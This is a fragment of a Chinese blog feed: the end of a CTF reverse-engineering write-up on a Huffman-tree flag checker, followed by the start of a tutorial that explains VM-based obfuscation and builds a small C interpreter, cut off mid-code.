class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="馒头"><a class="markdownIt-Anchor" href="#馒头"></a> 馒头</h3><p>数据结构哈夫曼树的构建和解码</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//大概的正向流程</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> data<span class="token punctuation">;</span>    <span class="token keyword">int</span> weight<span class="token punctuation">;</span>    <span class="token keyword">int</span> parent<span class="token punctuation">;</span>    <span class="token keyword">int</span> lch<span class="token punctuation">;</span>    <span class="token keyword">int</span> rch<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> htNode<span class="token punctuation">;</span><span class="token keyword">typedef</span> htNode <span class="token operator">*</span>huffmanTree<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">initHuffmanTree</span><span class="token punctuation">(</span>huffmanTree <span class="token operator">*</span>HT<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token operator">*</span>HT <span class="token operator">=</span> <span class="token punctuation">(</span>huffmanTree<span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">960</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">47</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        <span class="token punctuation">(</span><span class="token operator">*</span>HT<span class="token punctuation">)</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>parent <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span>HT<span class="token punctuation">)</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>lch <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span>HT<span class="token punctuation">)</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>rch <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"please input flag:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i_0 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i_0 <span class="token operator">&lt;=</span> <span class="token number">24</span><span class="token punctuation">;</span> <span class="token operator">++</span>i_0<span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        <span class="token punctuation">(</span><span class="token operator">*</span>HT<span class="token punctuation">)</span><span class="token punctuation">[</span>i_0<span class="token punctuation">]</span><span class="token punctuation">.</span>data <span class="token operator">=</span> i_0<span class="token punctuation">;</span>        <span class="token punctuation">(</span><span class="token operator">*</span>HT<span class="token punctuation">)</span><span class="token punctuation">[</span>i_0<span class="token punctuation">]</span><span class="token punctuation">.</span>weight <span class="token operator">=</span> <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">creatHuffmanTree</span><span class="token punctuation">(</span>huffmanTree <span class="token operator">*</span>HT<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> j<span class="token punctuation">;</span>      <span class="token comment">// [rsp+8h] [rbp-18h]</span>    <span class="token keyword">int</span> rnode<span class="token punctuation">;</span>  <span class="token comment">// [rsp+Ch] [rbp-14h]</span>    <span class="token keyword">int</span> min2<span class="token punctuation">;</span>   <span class="token comment">// [rsp+10h] [rbp-10h]</span>    <span class="token keyword">int</span> lnode<span class="token punctuation">;</span>  <span class="token comment">// [rsp+14h] [rbp-Ch]</span>    <span class="token keyword">int</span> min1<span class="token punctuation">;</span>   <span class="token comment">// [rsp+18h] [rbp-8h]</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>      <span class="token comment">// [rsp+1Ch] [rbp-4h]</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">2</span> <span class="token operator">*</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>          <span class="token punctuation">&#123;</span>            min1 <span class="token operator">=</span> <span class="token number">0x7FFF</span><span class="token punctuation">;</span>            lnode <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>            min2 <span class="token operator">=</span> <span class="token number">0x7FFF</span><span class="token punctuation">;</span>            rnode <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">></span> j<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span>  <span class="token comment">// 找到两个最小的节点</span>            <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>min1 <span class="token operator">></span> <span class="token punctuation">(</span><span class="token operator">*</span>HT<span class="token punctuation">)</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>weight <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token operator">*</span>HT<span class="token punctuation">)</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>parent <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>                <span class="token punctuation">&#123;</span>                    min2 <span class="token operator">=</span> min1<span class="token punctuation">;</span>                    rnode <span class="token operator">=</span> lnode<span class="token punctuation">;</span>                    min1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span>HT<span class="token punctuation">)</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>weight<span class="token punctuation">;</span>                    lnode <span class="token operator">=</span> j<span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>min2 <span class="token operator">></span> <span class="token punctuation">(</span><span class="token operator">*</span>HT<span class="token punctuation">)</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>weight <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token operator">*</span>HT<span class="token punctuation">)</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>parent <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>                <span class="token punctuation">&#123;</span>                    min2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span>HT<span class="token punctuation">)</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>weight<span class="token punctuation">;</span>                    rnode <span class="token operator">=</span> j<span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token punctuation">(</span><span class="token operator">*</span>HT<span class="token punctuation">)</span><span class="token punctuation">[</span>lnode<span class="token punctuation">]</span><span class="token punctuation">.</span>parent <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span>HT<span class="token punctuation">)</span><span class="token punctuation">[</span>rnode<span class="token punctuation">]</span><span class="token punctuation">.</span>parent <span class="token operator">=</span> i<span class="token punctuation">;</span>            <span class="token punctuation">(</span><span class="token operator">*</span>HT<span class="token punctuation">)</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>lch <span class="token operator">=</span> lnode<span class="token punctuation">;</span>            <span class="token punctuation">(</span><span class="token operator">*</span>HT<span class="token punctuation">)</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>rch <span class="token operator">=</span> rnode<span class="token punctuation">;</span>            <span class="token punctuation">(</span><span class="token operator">*</span>HT<span class="token punctuation">)</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>weight <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span>HT<span class="token punctuation">)</span><span class="token punctuation">[</span>lnode<span class="token punctuation">]</span><span class="token punctuation">.</span>weight <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token operator">*</span>HT<span class="token punctuation">)</span><span class="token punctuation">[</span>rnode<span class="token punctuation">]</span><span class="token punctuation">.</span>weight<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> ans1<span class="token punctuation">[</span><span class="token number">58</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">2270</span><span class="token punctuation">,</span> <span class="token number">917</span><span class="token punctuation">,</span> <span class="token number">446</span><span class="token punctuation">,</span> <span class="token number">217</span><span class="token punctuation">,</span> <span class="token number">106</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">229</span><span class="token punctuation">,</span> <span class="token number">114</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">471</span><span class="token punctuation">,</span> <span class="token number">233</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">238</span><span class="token punctuation">,</span> <span class="token number">118</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">1353</span><span class="token punctuation">,</span> <span class="token number">557</span><span class="token punctuation">,</span> <span class="token number">248</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">309</span><span class="token punctuation">,</span> <span class="token number">137</span><span class="token punctuation">,</span> <span class="token number">67</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">172</span><span class="token punctuation">,</span> <span class="token number">84</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">796</span><span class="token punctuation">,</span> <span class="token number">383</span><span class="token punctuation">,</span> <span class="token number">186</span><span class="token punctuation">,</span> <span class="token number">89</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">197</span><span class="token punctuation">,</span> <span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">413</span><span class="token punctuation">,</span> <span class="token number">203</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">210</span><span class="token punctuation">,</span> <span class="token number">104</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">18</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">check_flag</span><span class="token punctuation">(</span>huffmanTree HT<span class="token punctuation">,</span> <span class="token keyword">int</span> i<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">static</span> <span class="token keyword">int</span> index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;=</span> <span class="token number">24</span><span class="token punctuation">)</span>  <span class="token comment">// 对于叶子，只比对下标</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>HT<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>data <span class="token operator">!=</span> ans1<span class="token punctuation">[</span>index<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span>     <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>HT<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>weight <span class="token operator">!=</span> ans1<span class="token punctuation">[</span>index<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>HT<span class="token punctuation">[</span>HT<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>lch<span class="token punctuation">]</span><span class="token punctuation">.</span>data <span class="token operator">&lt;=</span> <span class="token number">24</span> <span class="token operator">&amp;&amp;</span> HT<span class="token punctuation">[</span>HT<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>lch<span class="token punctuation">]</span><span class="token punctuation">.</span>data <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>HT<span class="token punctuation">[</span>HT<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>lch<span class="token punctuation">]</span><span class="token punctuation">.</span>weight <span class="token operator">!=</span> ans1<span class="token punctuation">[</span>index<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>HT<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>lch <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span>          <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">check_flag</span><span class="token punctuation">(</span>HT<span class="token punctuation">,</span> HT<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>lch<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">check_flag</span><span class="token punctuation">(</span>HT<span class="token punctuation">,</span> HT<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>rch<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于每个叶子节点权值不会小于32，手画一下huffmantree就可以了</p><h3 id="舔狗四部曲-我的白月光"><a class="markdownIt-Anchor" href="#舔狗四部曲-我的白月光"></a> 舔狗四部曲 – 我的白月光</h3>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初识vm</title>
      <link href="/2024/04/21/%E5%88%9D%E8%AF%86vm/"/>
      <url>/2024/04/21/%E5%88%9D%E8%AF%86vm/</url>
      
        <content type="html"><![CDATA[<h1 id="reference"><a class="markdownIt-Anchor" href="#reference"></a> <strong>Reference</strong></h1><p><a href="https://blog.csdn.net/weixin_43876357/article/details/108570305">系统学习vm虚拟机逆向_vm_dispatcher-CSDN博客</a></p><p>[<a href="https://bbs.kanxue.com/thread-281119.htm">原创]VM逆向，一篇就够了（上）-CTF对抗-看雪-安全社区|安全招聘|kanxue.com</a><a href="https://www.cnblogs.com/nigacat/p/13039289.html">网鼎杯 signal 基础vm逆向及vm逆向分析思路 - nigacat - 博客园 (cnblogs.com)</a></p><p>[<a href="https://blog.csdn.net/qq_24481913/article/details/129371848">虚拟机逆向]UNCTF - 2019 EasyVm-CSDN博客</a></p><p><a href="https://xz.aliyun.com/t/3851?time__1311=n4%2BxnD0DBDgDRBD9AYD%2Fia4BK47Io4h5i%3DQw4D&amp;alichlgref=https%3A%2F%2Flink.csdn.net%2F%3Ftarget%3Dhttps%3A%2F%2Fxz.aliyun.com%2Ft%2F3851">逆向之虚拟机保护 - 先知社区 (aliyun.com)</a></p><p>学习vm的笔记</p><h1 id="vm正向"><a class="markdownIt-Anchor" href="#vm正向"></a> vm正向</h1><h2 id="原理"><a class="markdownIt-Anchor" href="#原理"></a> 原理</h2><p>程序运行时通过解释操作码（opcode）选择对应的函数（handle）执行</p><p>下图是虚拟机的基本结构</p><p>705</p><ul><li><p><strong>vm-init</strong></p><p>虚拟机的入口函数，对虚拟机环境进行初始化</p></li><li><p><strong>vm-dispatcher</strong><br />调度器，解释opcode，并选择对应的handle函数执行，当handle执行完会跳回这里，形成一个循环</p></li><li><p><strong>opcode</strong></p><p>程序可执行代码转换成的操作码</p></li></ul><p>因此在这种情况下如果要逆向该程序就需要对该程序的虚拟硬件结构进行逆向</p><h2 id="分析方法"><a class="markdownIt-Anchor" href="#分析方法"></a> 分析方法</h2><ul><li>给定可执行程序与opcode，逆向emulator，结合opcode，获得flag</li><li>只给可执行程序，逆向emulator，构造opcode，读取flag</li></ul><p>给定一个虚拟机程序，一般的解题步骤是这样的：</p><ol><li>找到虚拟机入口即vm-init函数，寻找虚拟机的输入以及opcode位置</li><li><strong>逆向emulator结构，dispatcher以及handler，分析清楚opcode的意义</strong></li><li>写一个opcode的解释器</li><li>逆向算法</li></ol><p>​调试过程中，在汇编层面调试当然是最基本最直接的方法，但是由于虚拟机Handler可能比较多，调试十分繁琐。<br />​若虚拟机内部没有很复杂的代码混淆，可以考虑使用IDA进行源码级调试，这对于快速整理emulator意义很有帮助。<br />​再进一步，可以结合IDA反编译伪代码，加上一些宏定义，加入输出，重新编译，可以十分快速的逆向整个emulator执行过程。</p><h2 id="实现自己的小型虚拟机"><a class="markdownIt-Anchor" href="#实现自己的小型虚拟机"></a> 实现自己的小型虚拟机</h2><h3 id="结构体"><a class="markdownIt-Anchor" href="#结构体"></a> 结构体</h3><h4 id="vm_cpu"><a class="markdownIt-Anchor" href="#vm_cpu"></a> vm_cpu</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">vm_cpus</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> r1<span class="token punctuation">;</span> 虚拟寄存器r1    <span class="token keyword">int</span> r2<span class="token punctuation">;</span> 虚拟寄存器r2    <span class="token keyword">int</span> r3<span class="token punctuation">;</span> 虚拟寄存器r3    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>eip<span class="token punctuation">;</span> 指向正在解释的opcode的地址    vm_opcode op_list<span class="token punctuation">[</span>OPCODE_N<span class="token punctuation">]</span><span class="token punctuation">;</span>    opcode列表，存放了所有的opcode及其对应的处理函数<span class="token punctuation">&#125;</span>vm_cpu<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="vm_opcode"><a class="markdownIt-Anchor" href="#vm_opcode"></a> vm_opcode</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">&#123;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> opcode<span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>handle<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>vm_opcode<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>r1-r3是定义的通用寄存器，用来传参或者是存放返回值，eip指向正在解释的opcode的地址，op_list则存放了所有opcode及其对应的handle函数。</p><p>然后开始实现解释器,对opcode进行解析，选择相应的handle函数，并且将相应的参数传递给handle函数，有handle函数模拟解释执行每一条指令</p><h3 id="handles"><a class="markdownIt-Anchor" href="#handles"></a> handles</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">mov_</span><span class="token punctuation">(</span>vm_cpu <span class="token operator">*</span>cpu<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">//change flag position</span><span class="token keyword">void</span> <span class="token function">xor_</span><span class="token punctuation">(</span>vm_cpu <span class="token operator">*</span>cpu<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">//xor flag , 0x1-0x9</span><span class="token keyword">void</span> <span class="token function">read_</span><span class="token punctuation">(</span>vm_cpu <span class="token operator">*</span>cpu<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//call read ,read the flag</span><span class="token keyword">void</span> <span class="token function">vm_init</span><span class="token punctuation">(</span>vm_cpu <span class="token operator">*</span>cpu<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">vm_start</span><span class="token punctuation">(</span>vm_cpu <span class="token operator">*</span>cpu<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">vm_dispatcher</span><span class="token punctuation">(</span>vm_cpu <span class="token operator">*</span>cpu<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//handles具体实现</span><span class="token keyword">void</span> <span class="token function">mov_</span><span class="token punctuation">(</span>vm_cpu <span class="token operator">*</span>cpu<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">/*//mov指令的参数都隐藏在字节码中，指令表示后的一个字节是寄存器标识，     * 第二到第五是要mov的数据在vm_stack上的偏移    //我这里只是实现了从vm_stack上取数据和存数据到vm_stack上*/</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>res<span class="token operator">=</span>cpu<span class="token operator">-></span>eip<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">//寄存器标识,即指令的第一个字节</span>    <span class="token keyword">int</span> <span class="token operator">*</span>offset<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>cpu<span class="token operator">-></span>eip<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//数据在vm_stack上的偏移,即指令的第二道第5字节</span>    <span class="token keyword">char</span> <span class="token operator">*</span>dest<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    dest<span class="token operator">=</span>vm_stack<span class="token punctuation">;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token operator">*</span>res<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">case</span> <span class="token number">0xe1</span><span class="token operator">:</span>            cpu<span class="token operator">-></span>r1<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span>dest<span class="token operator">+</span><span class="token operator">*</span>offset<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 从vm_stack上取数据，存储到cpu结构体的r1寄存器中</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">0xe2</span><span class="token operator">:</span>            cpu<span class="token operator">-></span>r2<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span>dest<span class="token operator">+</span><span class="token operator">*</span>offset<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 从vm_stack上取数据，存储到cpu结构体的r2寄存器中</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">0xe3</span><span class="token operator">:</span>            cpu<span class="token operator">-></span>r3<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span>dest<span class="token operator">+</span><span class="token operator">*</span>offset<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 从vm_stack上取数据，存储到cpu结构体的r3寄存器中</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">0xe4</span><span class="token operator">:</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> x<span class="token operator">=</span>cpu<span class="token operator">-></span>r1<span class="token punctuation">;</span> <span class="token comment">// 从cpu结构体的r1寄存器中取数据</span>            <span class="token operator">*</span><span class="token punctuation">(</span>dest<span class="token operator">+</span><span class="token operator">*</span>offset<span class="token punctuation">)</span><span class="token operator">=</span>x<span class="token punctuation">;</span> <span class="token comment">// 将数据存储到vm_stack的指定偏移位置上</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    cpu<span class="token operator">-></span>eip<span class="token operator">+=</span><span class="token number">6</span><span class="token punctuation">;</span> <span class="token comment">//mov指令占6个字节，eip向后偏移6位</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">xor_</span><span class="token punctuation">(</span>vm_cpu <span class="token operator">*</span>cpu<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> temp<span class="token punctuation">;</span>    temp<span class="token operator">=</span>cpu<span class="token operator">-></span>r1<span class="token operator">^</span>cpu<span class="token operator">-></span>r2<span class="token punctuation">;</span>    temp <span class="token operator">^=</span><span class="token number">0x12</span><span class="token punctuation">;</span>    cpu<span class="token operator">-></span>r1<span class="token operator">=</span>temp<span class="token punctuation">;</span>    cpu<span class="token operator">-></span>eip<span class="token operator">+=</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token comment">//xor指令占一个字节</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">read_</span><span class="token punctuation">(</span>vm_cpu <span class="token operator">*</span>cpu<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>dest<span class="token operator">=</span>vm_stack<span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>dest<span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//用于往虚拟栈中读入数据</span>    cpu<span class="token operator">-></span>eip<span class="token operator">+=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="实现解释器"><a class="markdownIt-Anchor" href="#实现解释器"></a> 实现解释器</h3><h4 id="vm_init"><a class="markdownIt-Anchor" href="#vm_init"></a> vm_init</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//vm_init函数</span><span class="token keyword">void</span> <span class="token function">vm_init</span><span class="token punctuation">(</span>vm_cpu <span class="token operator">*</span>cpu<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    cpu<span class="token operator">-></span>r1<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    cpu<span class="token operator">-></span>r2<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    cpu<span class="token operator">-></span>r3<span class="token operator">=</span><span 